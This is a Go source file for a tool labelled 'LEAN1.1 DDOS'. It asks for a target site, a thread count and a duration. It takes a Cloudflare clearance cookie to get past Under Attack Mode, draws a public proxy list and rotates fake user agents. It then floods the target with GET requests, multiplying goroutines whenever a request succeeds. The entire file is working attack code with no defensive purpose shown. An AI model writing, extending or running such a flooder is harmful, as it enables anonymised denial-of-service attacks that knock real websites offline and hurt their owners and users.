package main;import ("fmt";"io/ioutil";"math/rand";"net/http";"net/url";"strings";"time";browser "github.com/EDDYCJY/fake-useragent")
func main() {var lean1 string;var lean2 int;var lean3 int;fmt.Println("LEAN1.1 DDOS");fmt.Print("TARGET : ");fmt.Scan(&lean1);fmt.Print("THREAD : ");fmt.Scan(&lean2);fmt.Print("TIME   : ")
fmt.Scan(&lean3);fmt.Println("Website is protected by Cloudflare UAM or not? 1 if yes, 0 if no!");var lean4 int;fmt.Scan(&lean4);var lean5 string;if lean4 == 1 {fmt.Println("Please enter the cookie:") 
fmt.Scan(&lean5)} else {fmt.Println("Website is not protected by Cloudflare UAM.")};fmt.Println("Bot : check!");lean6 := time.Now().Add(time.Duration(lean3) * time.Second)
lean7, err := http.Get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all");if err != nil {fmt.Println("Bot : err!")}
defer lean7.Body.Close();lean8, _ := ioutil.ReadAll(lean7.Body);lean9 := strings.Split(string(lean8), "\r\n");lean10 := len(lean9);fmt.Print("Bot : ", lean10);fmt.Println(" Proxy ok!")
for i := 0; i < lean2; i++ {go func() {for time.Until(lean6) > 0 {lean11 := rand.Int63n(100000);rand.Seed(lean11);lean12 := rand.Intn(len(lean9));lean13 := lean9[lean12];lean14 := "http://" + lean13
lean15, _ := url.Parse(lean14);lean16 := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(lean15),},Timeout: 5 * time.Second,};lean17, _ := http.NewRequest("GET", lean1, nil)
if lean4 == 1 {lean19 := &http.Cookie{Name:  "cf_clearance",Value: lean5,};lean17.AddCookie(lean19)};lean17.Header.Set("User-Agent", browser.Random());lean18, err := lean16.Do(lean17)
if err != nil {continue};if lean18.StatusCode != http.StatusOK {fmt.Printf("\033[31m%s slow request!\033[0m\n", lean13);for i := 0; i < 10; i++ {_, err := lean16.Do(lean17);if err != nil {
continue}}};if lean18.StatusCode == http.StatusOK {fmt.Printf("\033[31m%s send request!\033[0m\n", lean13);for i := 0; i < 100; i++ {go func() {_, err := lean16.Do(lean17);if err != nil {
return}}()}}}}()};time.Sleep(time.Duration(lean3) * time.Second);fmt.Println("Attack end")}
